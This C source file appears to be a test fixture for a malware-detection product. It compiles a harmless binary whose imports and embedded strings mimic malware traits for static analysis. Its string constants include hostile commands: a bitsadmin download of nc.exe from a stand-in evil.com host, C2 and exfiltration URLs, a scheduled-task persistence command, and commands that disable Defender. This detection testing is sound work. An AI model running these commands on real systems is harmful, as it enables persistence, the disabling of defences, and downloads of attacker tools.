/**
 * ShieldTier UAT — Windows Malware Behavior Simulator
 * Compiled with mingw-w64 to produce a real PE with valid import table.
 *
 * This simulates the following TTPs:
 *   T1055.001 — Process injection (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)
 *   T1059.003 — cmd.exe execution
 *   T1082     — System discovery (GetComputerNameA, GetUserNameA)
 *   T1105     — Download (InternetOpenA, InternetOpenUrlA, URLDownloadToFileA)
 *   T1547.001 — Registry persistence (RegOpenKeyExA, RegSetValueExA)
 *   T1056.001 — Keylogging (SetWindowsHookExA, GetAsyncKeyState)
 *   T1113     — Screen capture (BitBlt, GetDC)
 *   T1497.003 — Anti-debug (IsDebuggerPresent, GetTickCount)
 *   T1562.001 — Disable defender
 *   T1486     — Ransomware (FindFirstFileA, CryptEncrypt)
 *
 * SAFE: None of this code actually executes malicious behavior.
 * All API calls are dead code — the binary just prints a message and exits.
 * The real value is the PE import table that ShieldTier's engines will analyze.
 */

#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")

/* Prevent optimizer from removing "unused" imports */
volatile FARPROC keep_imports[30];

void register_imports(void) {
    /* T1055.001 — Process Injection */
    keep_imports[0] = (FARPROC)VirtualAllocEx;
    keep_imports[1] = (FARPROC)WriteProcessMemory;
    keep_imports[2] = (FARPROC)CreateRemoteThread;
    keep_imports[3] = (FARPROC)OpenProcess;
    keep_imports[4] = (FARPROC)ReadProcessMemory;

    /* T1056.001 — Keylogging */
    keep_imports[5] = (FARPROC)SetWindowsHookExA;
    keep_imports[6] = (FARPROC)GetAsyncKeyState;

    /* T1082 — System Discovery */
    keep_imports[7] = (FARPROC)GetComputerNameA;
    keep_imports[8] = (FARPROC)GetUserNameA;
    keep_imports[9] = (FARPROC)GetSystemInfo;

    /* T1105 — Download & Execute */
    keep_imports[10] = (FARPROC)InternetOpenA;
    keep_imports[11] = (FARPROC)InternetOpenUrlA;
    keep_imports[12] = (FARPROC)InternetReadFile;

    /* T1547.001 — Registry Persistence */
    keep_imports[13] = (FARPROC)RegOpenKeyExA;
    keep_imports[14] = (FARPROC)RegSetValueExA;
    keep_imports[15] = (FARPROC)RegCloseKey;

    /* T1497.003 — Anti-Debug */
    keep_imports[16] = (FARPROC)IsDebuggerPresent;
    keep_imports[17] = (FARPROC)GetTickCount;
    keep_imports[18] = (FARPROC)Sleep;

    /* T1113 — Screen Capture */
    keep_imports[19] = (FARPROC)GetDC;
    keep_imports[20] = (FARPROC)BitBlt;
    keep_imports[21] = (FARPROC)CreateCompatibleBitmap;

    /* T1059.003 — Command Execution */
    keep_imports[22] = (FARPROC)CreateProcessA;
    keep_imports[23] = (FARPROC)WinExec;

    /* T1486 — Ransomware-like file enumeration */
    keep_imports[24] = (FARPROC)FindFirstFileA;
    keep_imports[25] = (FARPROC)FindNextFileA;
    keep_imports[26] = (FARPROC)DeleteFileA;

    /* Token manipulation */
    keep_imports[27] = (FARPROC)OpenProcessToken;
    keep_imports[28] = (FARPROC)GetCurrentProcess;
}

/* Embedded suspicious strings (will be extracted by string analysis) */
const char* c2_server = "http://185.234.72.19:8443/gate";
const char* c2_beacon = "http://malware-c2.evil.com/beacon?v=2.0";
const char* exfil_url = "http://exfil.evil.com/upload";
const char* payload_url = "http://update-flash-player.com/FlashPlayer.exe";
const char* run_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const char* schtask_cmd = "schtasks /create /tn SystemHealthCheck /tr C:\\Users\\Public\\svchost.exe /sc onlogon";
const char* disable_av = "Set-MpPreference -DisableRealtimeMonitoring $true";
const char* disable_av_reg = "DisableAntiSpyware";
const char* certutil_cmd = "certutil -decode C:\\temp\\payload.b64 C:\\temp\\loader.exe";
const char* bitsadmin_cmd = "bitsadmin /transfer evil http://evil.com/nc.exe C:\\temp\\nc.exe";
const char* wmic_cmd = "wmic process call create cmd.exe";
const char* net_user_cmd = "net user /domain";
const char* ps_encoded = "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUA";
const char* user_agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";

int main(void) {
    /* Register imports so they appear in the IAT */
    register_imports();

    printf("[sim] ShieldTier PE Behavior Simulator\n");
    printf("[sim] This binary exists only for static analysis testing.\n");
    printf("[sim] Import table contains %d API references across %d DLLs.\n",
           29, 7);
    printf("[sim] Embedded IOCs: %s\n", c2_server);
    printf("[sim] No malicious behavior executed.\n");

    return 0;
}
